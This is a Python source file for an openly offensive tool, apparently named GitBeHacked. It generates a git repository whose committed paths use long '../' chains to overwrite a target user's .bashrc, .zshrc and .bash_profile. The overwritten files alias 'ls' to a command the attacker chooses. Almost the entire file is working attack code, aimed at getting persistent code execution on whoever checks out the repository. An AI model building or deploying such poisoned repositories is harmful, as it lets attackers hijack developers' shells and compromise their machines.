import sys

from icecream import ic
from git import Repo
import os
import argparse

ic.configureOutput(prefix="")
####
# fu will output the func
# ic.configureOutput(prefix="")
# ic(fu(12))
# fu(12): 14
####
path = os.path.dirname(os.path.realpath(__file__))
superLongParentDir = "../"*20+".."

def evilFileGenerator(base,locations):

    fileExists = False
    if os.path.exists(base):
        fileExists = True
    for each in locations:
        if os.path.exists(each):
            fileExists = True

    if fileExists:
        print("[-] file is exists")
        print("[*] do you wanna remove?[y/N]" ,end="")
        feedback = input("")
        if feedback in ["y","Y"]:
            if os.path.isdir(base):
                os.rmdir(base)
        else:
            raise RuntimeError("[-] Conflict ....")


    with open("bashrc","r") as f:
        evilFileFormat = f.read()

    print("[*] you evil command will set as the alias of ls command")
    print("[*] Your command: ",end="")
    userCommand = input()

    os.mkdir(base)
    for eachLocation in locations:
        print("[+] file written now is ",eachLocation)
        with open(eachLocation,"w+") as f:
            f.write(evilFileFormat.replace("<hashtag>",userCommand))

    print("[+] file generated successfully")
    print("[+] evil file location is ",locations)
    pass


def badRepoGenerator( username :str,outputDirName="test",
                      badfileName=".evilcodeExec",
                      fuckMethod="rcfile" ,os = "linux"):

    assert outputDirName not in [ "","/" ]

    path = "./"
    workingDirectory = path + outputDirName
    print("[+] Generate ",end = "")

    badRepo = Repo.init( path=workingDirectory,mkdir=True )

    if os == "linux":
        if fuckMethod == "rcfile":
            evilPayloadBaseDir = superLongParentDir+"/home/"+username+"/"
            evilPayloadLocation = []
            for eachfile in [".zshrc",".bashrc",".bash_profile"]:
                evilPayloadLocation.append(evilPayloadBaseDir+eachfile)
            ic(evilPayloadLocation)
            evilFileGenerator(evilPayloadBaseDir,evilPayloadLocation)

            badRepo.index.add(evilPayloadLocation)
            badRepo.index.commit("Evil Generated!")

            print("[+] Generate Repo successfully")
        pass


    elif os == "win" :

        pass # not available now

def argcheck(obj):
    try :
        assert obj.os in ["linux","win"]
        assert obj.method in ["cron","start","rcfile"]
    except AssertionError :
        print("[-] args error")
        exit(-2)


def main():
    praser = argparse.ArgumentParser()
    praser.add_argument("-D","--outputDirectoryName",help="your repo with contain in this directory default is test",default="test")
    praser.add_argument("--user",help="target username")
    praser.add_argument("--os",help="os version [ win, linux ] default is linux",default="linux")
    praser.add_argument("--method",help="attack method [ cron, start, rcfile ]",default="rcfile")
    praser.add_argument("--badfilename",help="badfile in cron mode name",default=".evilcode")
    arg = praser.parse_args()
    argcheck(arg)
    badRepoGenerator(arg.user,
                     outputDirName=arg.outputDirectoryName,
                     badfileName=arg.badfilename,
                     fuckMethod=arg.method,
                     os=arg.os
                     )


def banner():
    print('''
              ____ _ _   ____       _   _            _            _ 
             / ___(_) |_| __ )  ___| | | | __ _  ___| | _____  __| |
            | |  _| | __|  _ \ / _ \ |_| |/ _` |/ __| |/ / _ \/ _` |
            | |_| | | |_| |_) |  __/  _  | (_| | (__|   <  __/ (_| |
             \____|_|\__|____/ \___|_| |_|\__,_|\___|_|\_\___|\__,_|
                                                                        ''')
    
    pass

if __name__ == "__main__":
    banner()
    try:
        os.setuid(0)
    except PermissionError:
        print("[-] We need root privilege to generate payload")
        print("[*] Now privilege is: "+os.popen("whoami").read())
        exit(-1)
    main()